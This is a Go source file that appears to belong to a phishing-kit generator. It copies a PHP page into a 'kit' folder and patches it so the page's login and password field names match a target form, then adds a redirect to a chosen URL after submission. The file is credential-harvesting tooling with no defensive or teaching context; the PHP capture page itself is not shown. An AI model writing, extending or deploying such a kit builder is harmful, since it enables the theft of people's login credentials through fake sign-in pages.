package main

import (
	"bytes"
	"html"
	"os"
	"path"
)

// copyPhpToKit copies the PHP file to the destination folder.
func copyPhpToKit(phpfilename string, destFolder string) error {
	phpfile, err := os.ReadFile(phpfilename)
	if err != nil {
		return err
	}
	if err := os.WriteFile(path.Join(destFolder, phpfilename), phpfile, 0644); err != nil {
		return err
	}
	return nil
}

// patchPhp patches the PHP file with URL redirection and correct attribute names for credentials.
func patchPhp(phppath string, postLogin string, postPassword string, urlin string) error {
	contents, err := os.ReadFile(phppath)
	if err != nil {
		return err
	}
	newContents := []byte(contents)

	if postLogin != "login" {
		postLogin = html.EscapeString(postLogin)
		newContents = bytes.Replace(newContents, []byte("$parsed['login']"), []byte("$parsed['"+postLogin+"']"), -1)
	}

	if postPassword != "password" {
		postPassword = html.EscapeString(postPassword)
		newContents = bytes.Replace(newContents, []byte("$parsed['password']"), []byte("$parsed['"+postPassword+"']"), -1)
	}

	newContents = bytes.Replace(newContents, []byte("header('Location: \"\"');"), []byte("header('Location: "+urlin+"');"), -1)

	if err := os.WriteFile(phppath, newContents, 0); err != nil {
		return err
	}
	return nil
}
